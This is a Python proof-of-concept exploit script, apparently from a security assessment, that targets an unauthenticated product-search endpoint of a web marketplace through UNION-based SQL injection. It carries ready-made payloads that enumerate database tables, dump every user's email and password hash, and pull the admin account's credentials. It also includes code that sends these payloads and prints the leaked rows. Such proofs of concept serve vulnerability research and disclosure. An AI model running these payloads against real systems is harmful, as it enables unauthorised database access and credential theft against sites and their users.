#!/usr/bin/env python3
"""
SQLI-1 — UNION-Based SQL Injection via Product Search
Endpoint: GET /api/products/search?q=<payload>
Auth    : None — fully unauthenticated

The /api/products/search endpoint builds a raw SQL query using an
f-string, interpolating the `q` parameter directly:

    f"SELECT id, title, description, price, quantity, category, seller_id
      FROM products
      WHERE is_active = 1 AND (title LIKE '%{q}%' OR description LIKE '%{q}%')
      LIMIT 20"

No parameterization. UNION injection terminates the LIKE clause and
appends an attacker-controlled SELECT. The 7-column structure means
the injected SELECT must return 7 columns. Leaked values land in
`title` (col 2) and `description` (col 3) of the JSON response.

Payloads
--------
  Enumerate tables:
    %') UNION SELECT 1,name,sql,4,5,6,7 FROM sqlite_master WHERE type='table'--

  Dump users (email + hashed password):
    %') UNION SELECT id,email,hashed_password,0,0,'users',0 FROM users--

  Dump all columns of a single user:
    %') UNION SELECT id,email,hashed_password,0,0,role,0 FROM users WHERE email='admin@mercury.com'--

Usage
-----
    python poc_016_sqli_product_search.py
    python poc_016_sqli_product_search.py --url http://localhost:8000
    python poc_016_sqli_product_search.py --payload "' UNION SELECT 1,name,sql,4,5,6,7 FROM sqlite_master WHERE type='table'--"
"""

import argparse
import sys
import requests

ENUMERATE_TABLES   = "%') UNION SELECT 1,name,sql,4,5,6,7 FROM sqlite_master WHERE type='table'--"
DUMP_USERS         = "%') UNION SELECT id,email,hashed_password,0,0,'users',0 FROM users--"
DUMP_ADMIN         = "%') UNION SELECT id,email,hashed_password,0,0,role,0 FROM users WHERE email='admin@mercury.com'--"


def banner():
    print("=" * 60)
    print("  SQLI-1 — UNION SQLi via Product Search")
    print("  Endpoint: GET /api/products/search?q=<payload>")
    print("  Auth: None required")
    print("=" * 60)


def search(base_url, q):
    resp = requests.get(
        f"{base_url}/api/products/search",
        params={"q": q},
        timeout=10,
    )
    if resp.status_code == 200:
        return resp.json()
    print(f"[-] {resp.status_code}: {resp.text[:200]}")
    return []


def dump(base_url, payload, label):
    print(f"\n[*] {label}")
    print(f"    Payload: {payload}")
    rows = search(base_url, payload)
    if rows:
        print(f"    Results ({len(rows)} rows):")
        for r in rows:
            print(f"      id={r.get('id')}  title={r.get('title')!r}  description={r.get('description')!r}  category={r.get('category')!r}")
    else:
        print("    No rows returned")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--payload", default=None, help="Custom payload (default: runs full demo)")
    args = parser.parse_args()

    banner()
    print(f"[*] Target: {args.url}")

    # Confirm endpoint is reachable
    baseline = search(args.url, "headphones")
    print(f"[+] Baseline search returned {len(baseline)} product(s)")

    if args.payload:
        dump(args.url, args.payload, "Custom payload")
    else:
        dump(args.url, ENUMERATE_TABLES,  "Step 1 — Enumerate tables via sqlite_master")
        dump(args.url, DUMP_USERS,        "Step 2 — Dump all user emails + password hashes")
        dump(args.url, DUMP_ADMIN,        "Step 3 — Dump admin credentials specifically")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
